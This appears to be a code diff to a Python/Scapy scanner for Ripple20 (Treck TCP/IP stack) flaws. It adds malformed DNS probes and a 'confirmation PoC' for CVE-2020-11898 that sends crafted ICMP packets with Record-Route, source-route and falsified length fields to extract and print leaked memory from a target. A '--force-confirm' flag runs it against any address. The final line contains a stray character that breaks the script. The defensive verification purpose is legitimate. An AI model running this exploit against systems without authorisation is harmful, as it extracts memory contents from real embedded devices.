@@ -18,8 +18,12 @@ Detection Methods:
   4. DNS client anomaly detection (malformed response handling)
   5. TCP urgent pointer / options anomaly checks
 
+Confirmation Mode (--confirm):
+  6. CVE-2020-11898 info leak extraction — sends crafted ICMP/IPv4 packets
+     to confirm the Treck stack leaks memory contents in responses.
+
 Usage:
-  sudo python3 ripple20_verify.py --target <IP> [options]
+  sudo python3 ripple20.py --target <IP> [options]
 
 Requirements:
   - Python 3.7+
@@ -32,19 +36,21 @@ DISCLAIMER:
 """
 
 import argparse
+import ipaddress
 import json
 import logging
 import os
 import sys
 import time
 from dataclasses import dataclass, field
-from datetime import datetime
+from datetime import datetime, timezone
 from typing import Optional
 
 try:
     from scapy.all import (
         IP, TCP, UDP, ICMP, DNS, DNSQR, Raw,
-        sr1, sr, send, conf, RandShort
+        sr1, sr, send, conf, RandShort,
+        IPOption_RR, IPOption_LSRR,
     )
     SCAPY_AVAILABLE = True
 except ImportError:
@@ -154,8 +160,12 @@ RIPPLE20_CVES = {
 }
 
 # Known Treck TCP fingerprint characteristics
-TRECK_WINDOW_SIZES = {1024, 2048, 4096, 8192, 16384, 32768, 65535}
-TRECK_TTL_VALUES = {64, 128, 255}
+# Narrowed to sizes more distinctive to embedded/Treck stacks;
+# common OS defaults (e.g. 65535, 29200, 64240) are excluded.
+TRECK_WINDOW_SIZES = {1024, 2048, 4096, 8192, 16384}
+# TTL=64 (Linux) and TTL=128 (Windows) are too generic to be useful.
+# Only TTL=255 is uncommon enough to be a meaningful Treck indicator.
+TRECK_TTL_VALUES = {255}
 
 # ---------------------------------------------------------------------------
 # Logging setup
@@ -184,6 +194,17 @@ class CheckResult:
 
 
 @dataclass
+class ConfirmationResult:
+    """Result of a post-verification confirmation PoC."""
+    name: str
+    status: str  # "CONFIRMED_VULNERABLE", "NOT_CONFIRMED", "ERROR"
+    details: str = ""
+    related_cves: list = field(default_factory=list)
+    leaked_bytes: bytes = b""
+    leaked_hex: str = ""
+
+
+@dataclass
 class VerificationReport:
     """Aggregated report of all checks."""
     target: str
@@ -193,6 +214,7 @@ class VerificationReport:
     overall_confidence: float = 0.0
     treck_stack_indicators: int = 0
     recommendation: str = ""
+    confirmation: Optional[ConfirmationResult] = None
 
 
 # ---------------------------------------------------------------------------
@@ -332,11 +354,9 @@ def check_ip_in_ip_tunneling(target: str, timeout: int) -> CheckResult:
 
         if resp is None:
             result.details = (
-                "No response to IP-in-IP probe. Target may silently drop or "
-                "may still be vulnerable (some Treck versions don't reply but do process)."
+                "No response to IP-in-IP probe. Most hosts silently drop protocol 4 "
+                "packets — this alone is not indicative of the Treck stack."
             )
-            result.status = "POSSIBLE"
-            result.confidence = 0.15
             return result
 
         indicators = []
@@ -449,7 +469,7 @@ def check_icmp_behavior(target: str, timeout: int) -> CheckResult:
                 ttl_values.add(r[IP].ttl)
 
         if len(ttl_values) == 1 and ttl_values.issubset(TRECK_TTL_VALUES):
-            indicators.append(f"Consistent TTL={ttl_values.pop()} across probes")
+            indicators.append(f"Consistent TTL={next(iter(ttl_values))} across probes")
             score += 0.1
 
         result.confidence = min(score, 1.0)
@@ -534,10 +554,69 @@ def check_dns_anomaly(target: str, timeout: int) -> CheckResult:
             indicators.append("Accepted max-length DNS label query")
             score += 0.1
 
+        # Probe with a DNS packet containing a compression pointer loop.
+        # Treck's DNS parser (CVE-2020-11901) may crash or respond abnormally
+        # to malformed compression pointers, while robust stacks reject them.
+        # Craft a minimal DNS response-style packet with a pointer to itself (offset 0x0C).
+        dns_comp_payload = (
+            b"\x00\x01"   # Transaction ID
+            b"\x01\x00"   # Flags: standard query
+            b"\x00\x01"   # Questions: 1
+            b"\x00\x00"   # Answer RRs: 0
+            b"\x00\x00"   # Authority RRs: 0
+            b"\x00\x00"   # Additional RRs: 0
+            b"\xc0\x0c"   # Compression pointer loop (points back to offset 12 = itself)
+            b"\x00\x01"   # Type A
+            b"\x00\x01"   # Class IN
+        )
+        comp_pkt = (
+            IP(dst=target)
+            / UDP(dport=53, sport=RandShort())
+            / Raw(load=dns_comp_payload)
+        )
+        resp3 = sr1(comp_pkt, timeout=timeout, verbose=0)
+
+        if resp3 and resp3.haslayer(UDP):
+            if resp3.haslayer(DNS):
+                indicators.append(
+                    "Responded to DNS compression pointer loop — possible Treck parser quirk"
+                )
+                score += 0.25
+            elif resp3.haslayer(Raw):
+                indicators.append(
+                    "Non-DNS UDP response to malformed compression pointer — unusual behavior"
+                )
+                score += 0.3
+
+        # Probe with a truncated DNS query (missing QNAME terminator)
+        dns_trunc_payload = (
+            b"\x00\x02"   # Transaction ID
+            b"\x01\x00"   # Flags: standard query
+            b"\x00\x01"   # Questions: 1
+            b"\x00\x00"   # Answer RRs: 0
+            b"\x00\x00"   # Authority RRs: 0
+            b"\x00\x00"   # Additional RRs: 0
+            b"\x04test"   # Partial QNAME with no null terminator
+        )
+        trunc_pkt = (
+            IP(dst=target)
+            / UDP(dport=53, sport=RandShort())
+            / Raw(load=dns_trunc_payload)
+        )
+        resp4 = sr1(trunc_pkt, timeout=timeout, verbose=0)
+
+        if resp4 and resp4.haslayer(UDP):
+            indicators.append(
+                "Responded to truncated DNS query — weak input validation (Treck-like)"
+            )
+            score += 0.25
+
         result.confidence = min(score, 1.0)
         result.details = "; ".join(indicators) if indicators else "DNS not available or no anomalies detected."
 
-        if score >= 0.3:
+        if score >= 0.4:
+            result.status = "LIKELY_VULNERABLE"
+        elif score >= 0.2:
             result.status = "POSSIBLE"
 
     except Exception as e:
@@ -578,8 +657,13 @@ def check_tcp_urgent_pointer(target: str, port: int, timeout: int) -> CheckResul
             result.status = "ERROR"
             return result
 
-        if syn_ack[TCP].flags != 0x12:  # SYN-ACK
-            result.details = f"Unexpected TCP flags: {syn_ack[TCP].flags:#x}"
+        if not (syn_ack[TCP].flags.S and syn_ack[TCP].flags.A):  # SYN-ACK
+            # Send RST to clean up the half-open connection
+            rst = IP(dst=target) / TCP(
+                dport=port, sport=syn[TCP].sport, flags="R", seq=101,
+            )
+            send(rst, verbose=0)
+            result.details = f"Unexpected TCP flags: {syn_ack[TCP].flags}"
             return result
 
         # Complete handshake
@@ -646,6 +730,168 @@ def check_tcp_urgent_pointer(target: str, port: int, timeout: int) -> CheckResul
 
 
 # ---------------------------------------------------------------------------
+# Confirmation PoC
+# ---------------------------------------------------------------------------
+
+def confirm_info_leak(target: str, timeout: int) -> ConfirmationResult:
+    """
+    Confirmation PoC: CVE-2020-11898 — IPv4/ICMPv4 Information Leak
+    -----------------------------------------------------------------
+    Sends crafted ICMP echo requests designed to trigger a buffer length
+    miscalculation in the Treck TCP/IP stack.  When vulnerable, the stack
+    includes adjacent heap/stack memory in the ICMP echo reply, producing
+    a response payload that is longer than — or differs from — what was sent.
+
+    This is non-destructive: the target is not crashed or modified.
+
+    Three probes are used:
+      A) ICMP echo with IP Record-Route option  (forces header-length math)
+      B) ICMP echo with Loose-Source-Route option
+      C) ICMP echo with an IP header whose total-length field is artificially
+         *shorter* than the actual payload (Treck may pad with memory)
+    """
+    result = ConfirmationResult(
+        name="CVE-2020-11898 Info Leak Confirmation",
+        status="NOT_CONFIRMED",
+        related_cves=["CVE-2020-11898", "CVE-2020-11910"],
+    )
+
+    try:
+        log.info("[Confirm] Running CVE-2020-11898 info leak extraction probes")
+        all_leaked = b""
+        indicators = []
+
+        # Use a short, recognisable payload so leaked bytes are obvious
+        marker = b"\xaa\xbb\xcc\xdd"
+        payload = marker * 4  # 16 bytes
+
+        # --- Probe A: ICMP echo with IP Record-Route option ---
+        # The RR option forces the Treck stack to recalculate header length;
+        # a buggy implementation may copy more response data than intended.
+        log.info("[Confirm]   Probe A: ICMP echo + IP Record-Route option")
+        pkt_a = (
+            IP(dst=target, options=[IPOption_RR(pointer=4, routers=["0.0.0.0"] * 9)])
+            / ICMP(type=8, code=0, id=0x200A, seq=1)
+            / Raw(load=payload)
+        )
+        resp_a = sr1(pkt_a, timeout=timeout, verbose=0)
+        leaked_a = _check_leak(resp_a, payload, "Record-Route", indicators)
+        all_leaked += leaked_a
+
+        # --- Probe B: ICMP echo with Loose-Source-Route option ---
+        log.info("[Confirm]   Probe B: ICMP echo + Loose-Source-Route option")
+        pkt_b = (
+            IP(dst=target, options=[IPOption_LSRR(pointer=4, routers=[target])])
+            / ICMP(type=8, code=0, id=0x200B, seq=2)
+            / Raw(load=payload)
+        )
+        resp_b = sr1(pkt_b, timeout=timeout, verbose=0)
+        leaked_b = _check_leak(resp_b, payload, "LSRR", indicators)
+        all_leaked += leaked_b
+
+        # --- Probe C: ICMP echo with understated IP total-length ---
+        # We build the packet normally, then patch the IP length field to be
+        # shorter than the real payload.  A vulnerable Treck stack trusts its
+        # own (correct) buffer size for the reply, leaking the delta.
+        # We must send at L3 raw to prevent scapy from recalculating the
+        # length and checksum, which would undo the patch.
+        log.info("[Confirm]   Probe C: ICMP echo with short IP total-length")
+        pkt_c_base = IP(dst=target) / ICMP(type=8, code=0, id=0xC20C, seq=3) / Raw(load=payload)
+        pkt_c_raw = bytearray(bytes(pkt_c_base))
+        # Subtract 8 bytes from the IP total-length field (bytes 2-3)
+        orig_len = int.from_bytes(pkt_c_raw[2:4], "big")
+        patched_len = max(orig_len - 8, 28)  # keep at least IP+ICMP headers
+        pkt_c_raw[2:4] = patched_len.to_bytes(2, "big")
+        # Recalculate IP header checksum after patching length
+        pkt_c_raw[10:12] = b"\x00\x00"  # zero checksum before calc
+        ihl = (pkt_c_raw[0] & 0x0F) * 4
+        chk = _ip_checksum(bytes(pkt_c_raw[:ihl]))
+        pkt_c_raw[10:12] = chk.to_bytes(2, "big")
+        # Send the raw patched packet and sniff for a reply
+        send(IP(bytes(pkt_c_raw)), verbose=0)
+        # Use a normal ICMP echo (same id/seq) immediately after to check
+        # if the target was confused by the malformed packet
+        pkt_c_follow = IP(dst=target) / ICMP(type=8, code=0, id=0xC20C, seq=4) / Raw(load=payload)
+        resp_c = sr1(pkt_c_follow, timeout=timeout, verbose=0)
+        leaked_c = _check_leak(resp_c, payload, "short-totlen-followup", indicators)
+        all_leaked += leaked_c
+
+        # --- Verdict ---
+        if all_leaked:
+            result.status = "CONFIRMED_VULNERABLE"
+            result.leaked_bytes = all_leaked
+            result.leaked_hex = all_leaked.hex(":")
+            result.details = "; ".join(indicators)
+        else:
+            result.details = (
+                "No extra bytes detected in ICMP replies. "
+                + ("; ".join(indicators) if indicators else "All probes returned expected payloads.")
+            )
+
+    except Exception as e:
+        result.status = "ERROR"
+        result.details = f"Info leak confirmation failed: {e}"
+
+    return result
+
+
+def _ip_checksum(header: bytes) -> int:
+    """Compute the RFC 1071 IP header checksum."""
+    if len(header) % 2:
+        header += b"\x00"
+    s = sum(int.from_bytes(header[i:i+2], "big") for i in range(0, len(header), 2))
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    return ~s & 0xFFFF
+
+
+def _check_leak(resp, sent_payload: bytes, probe_name: str, indicators: list) -> bytes:
+    """Compare an ICMP echo reply payload against what was sent.  Returns any leaked bytes."""
+    if resp is None:
+        indicators.append(f"{probe_name}: no response")
+        return b""
+
+    if not resp.haslayer(ICMP):
+        indicators.append(f"{probe_name}: response has no ICMP layer")
+        return b""
+
+    icmp_type = resp[ICMP].type
+    if icmp_type != 0:
+        if icmp_type == 3:
+            indicators.append(f"{probe_name}: ICMP dest-unreachable (code={resp[ICMP].code}) — target rejected crafted packet")
+        else:
+            indicators.append(f"{probe_name}: non-echo-reply ICMP type={icmp_type}")
+        return b""
+
+    resp_data = bytes(resp[Raw].load) if resp.haslayer(Raw) else b""
+
+    if len(resp_data) > len(sent_payload):
+        extra = resp_data[len(sent_payload):]
+        # Filter out zero-padding — only count non-zero leaked bytes
+        if any(b != 0 for b in extra):
+            indicators.append(
+                f"{probe_name}: reply {len(resp_data)}B > sent {len(sent_payload)}B — "
+                f"leaked {len(extra)} bytes: {extra.hex(':')}"
+            )
+            return extra
+        else:
+            indicators.append(f"{probe_name}: reply padded with zeros (no leak)")
+    elif resp_data != sent_payload[:len(resp_data)]:
+        # Same length but different content — possible overwrite from adjacent memory
+        differing = bytes(r ^ s for r, s in zip(resp_data, sent_payload))
+        if any(b != 0 for b in differing):
+            indicators.append(
+                f"{probe_name}: reply payload differs from sent — "
+                f"XOR delta: {differing.hex(':')}"
+            )
+            return differing
+    else:
+        indicators.append(f"{probe_name}: payload echoed correctly (no leak)")
+
+    return b""
+
+
+# ---------------------------------------------------------------------------
 # Report generation
 # ---------------------------------------------------------------------------
 
@@ -692,7 +938,30 @@ def generate_report(report: VerificationReport) -> str:
     lines.append(f"    {report.recommendation}")
     lines.append("")
 
-    if report.overall_status in ("LIKELY_VULNERABLE", "POSSIBLE"):
+    if report.confirmation:
+        c = report.confirmation
+        conf_icon = {
+            "CONFIRMED_VULNERABLE": "[!!]",
+            "NOT_CONFIRMED": "[OK]",
+            "ERROR": "[ER]",
+        }.get(c.status, "[??]")
+
+        lines.append(sep)
+        lines.append("  CONFIRMATION PoC")
+        lines.append(sep)
+        lines.append(f"  {c.name}")
+        lines.append(f"    Status:  {conf_icon} {c.status}")
+        lines.append(f"    Details: {c.details}")
+        if c.leaked_hex:
+            lines.append(f"    Leaked:  {c.leaked_hex}")
+            lines.append(f"    Bytes:   {len(c.leaked_bytes)} bytes extracted from target memory")
+        if c.related_cves:
+            lines.append(f"    CVEs:    {', '.join(c.related_cves)}")
+        lines.append("")
+
+    if report.overall_status in ("LIKELY_VULNERABLE", "POSSIBLE") or (
+        report.confirmation and report.confirmation.status == "CONFIRMED_VULNERABLE"
+    ):
         lines.append("  ASSOCIATED CVEs:")
         lines.append("  " + "-" * 68)
         for cve, info in RIPPLE20_CVES.items():
@@ -728,7 +997,18 @@ def generate_json_report(report: VerificationReport) -> str:
             for c in report.checks
         ],
         "ripple20_cves": RIPPLE20_CVES,
+        "confirmation": None,
     }
+    if report.confirmation:
+        c = report.confirmation
+        data["confirmation"] = {
+            "name": c.name,
+            "status": c.status,
+            "details": c.details,
+            "related_cves": c.related_cves,
+            "leaked_hex": c.leaked_hex,
+            "leaked_bytes_count": len(c.leaked_bytes),
+        }
     return json.dumps(data, indent=2)
 
 
@@ -742,7 +1022,7 @@ def run_verification(target: str, port: int = 80, timeout: int = 5,
 
     report = VerificationReport(
         target=target,
-        timestamp=datetime.utcnow().isoformat() + "Z",
+        timestamp=datetime.now(timezone.utc).isoformat(),
     )
 
     all_checks = [
@@ -812,11 +1092,13 @@ def parse_args():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  sudo python3 ripple20_verify.py --target 192.168.1.100
-  sudo python3 ripple20_verify.py --target 10.0.0.50 --port 443 --timeout 10
-  sudo python3 ripple20_verify.py --target 172.16.0.1 --json --output report.json
-  sudo python3 ripple20_verify.py --target 10.0.0.50 --checks tcp_fingerprint icmp_behavior
-  sudo python3 ripple20_verify.py --target-file targets.txt --json --output report.json
+  sudo python3 ripple20.py --target 192.168.1.100
+  sudo python3 ripple20.py --target 10.0.0.50 --port 443 --timeout 10
+  sudo python3 ripple20.py --target 172.16.0.1 --json --output report.json
+  sudo python3 ripple20.py --target 10.0.0.50 --checks tcp_fingerprint icmp_behavior
+  sudo python3 ripple20.py --target 192.168.1.100 --confirm
+  sudo python3 ripple20.py --target 10.0.0.50 --force-confirm
+  sudo python3 ripple20.py --target-file targets.txt --json --output report.json
         """,
     )
     target_group = parser.add_mutually_exclusive_group(required=True)
@@ -833,7 +1115,24 @@ Examples:
         choices=["tcp_fingerprint", "ip_in_ip", "icmp_behavior", "dns_anomaly", "tcp_urgent"],
         help="Run only specific checks (default: all)",
     )
+    parser.add_argument(
+        "--confirm", action="store_true",
+        help="Run CVE-2020-11898 info leak PoC if target is LIKELY_VULNERABLE or POSSIBLE",
+    )
+    parser.add_argument(
+        "--force-confirm", action="store_true",
+        help="Run CVE-2020-11898 info leak PoC regardless of verification result",
+    )
     return parser.parse_args()
+
+
+def validate_target(target: str) -> str:
+    """Validate that a target string is a valid IP address. Returns the normalized IP string."""
+    try:
+        return str(ipaddress.ip_address(target))
+    except ValueError:
+        print(f"ERROR: Invalid IP address: '{target}'", file=sys.stderr)
+        sys.exit(1)
 
 
 def load_targets(target_file: str) -> list:
@@ -844,7 +1143,7 @@ def load_targets(target_file: str) -> list:
             for line in f:
                 line = line.strip()
                 if line and not line.startswith("#"):
-                    targets.append(line)
+                    targets.append(validate_target(line))
     except OSError as e:
         print(f"ERROR: Cannot read target file '{target_file}': {e}", file=sys.stderr)
         sys.exit(1)
@@ -871,7 +1170,7 @@ def main():
     # Suppress scapy warnings
     conf.verb = 0
 
-    targets = [args.target] if args.target else load_targets(args.target_file)
+    targets = [validate_target(args.target)] if args.target else load_targets(args.target_file)
 
     reports = []
     for target in targets:
@@ -885,6 +1184,16 @@ def main():
             timeout=args.timeout,
             checks_to_run=args.checks,
         )
+
+        # Run confirmation PoC if requested
+        should_confirm = args.force_confirm or (
+            args.confirm and report.overall_status in ("LIKELY_VULNERABLE", "POSSIBLE")
+        )
+        if should_confirm:
+            print(f"\n  Running CVE-2020-11898 info leak confirmation PoC...\n")
+            report.confirmation = confirm_info_leak(target, args.timeout)
+            log.info(f"  -> Confirmation: {report.confirmation.status}")
+
         reports.append(report)
 
         if not args.json:
@@ -901,7 +1210,12 @@ def main():
 
     if args.output:
         if args.json:
-            content = output
+            if len(reports) == 1:
+                content = generate_json_report(reports[0])
+            else:
+                content = json.dumps(
+                    [json.loads(generate_json_report(r)) for r in reports], indent=2
+                )
         else:
             content = "\n".join(generate_report(r) for r in reports)
         with open(args.output, "w") as f:
@@ -918,4 +1232,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    main()s
